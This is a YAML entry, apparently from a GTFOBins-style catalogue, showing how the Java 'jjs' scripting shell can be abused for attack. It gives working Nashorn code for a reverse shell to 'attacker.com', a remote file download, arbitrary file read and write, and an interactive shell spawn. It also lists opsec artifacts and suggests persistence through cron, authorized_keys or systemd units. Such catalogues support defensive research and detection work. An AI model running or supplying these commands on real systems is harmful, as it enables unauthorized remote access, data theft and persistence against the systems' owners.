---
name: jjs
capabilities:
- exec
- spawn
- read
- write
- download
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: This tool is installed starting with Java SE 8.
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    jjs
    var URL = Java.type('java.net.URL');
    var ws = new URL('http://attacker.com/path/to/input-file');
    var Channels = Java.type('java.nio.channels.Channels');
    var rbc = Channels.newChannel(ws.openStream());
    var FileOutputStream = Java.type('java.io.FileOutputStream');
    var fos = new FileOutputStream('/path/to/output-file');
    fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
    fos.close();
    rbc.close();
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    jjs
    var BufferedReader = Java.type('java.io.BufferedReader');
    var FileReader = Java.type('java.io.FileReader');
    var br = new BufferedReader(new FileReader('/path/to/input-file'));
    while ((line = br.readLine()) != null) { print(line); }
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    jjs
    var FileWriter = Java.type('java.io.FileWriter');
    var fw=new FileWriter('/path/to/output-file');
    fw.write('DATA');
    fw.close();
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    jjs
    var host='attacker.com';
    var port=12345;
    var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
    var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();
    var Socket = Java.type('java.net.Socket');
    var s=new Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    jjs
    Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
references:
- https://gtfobins.github.io/gtfobins/jjs/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
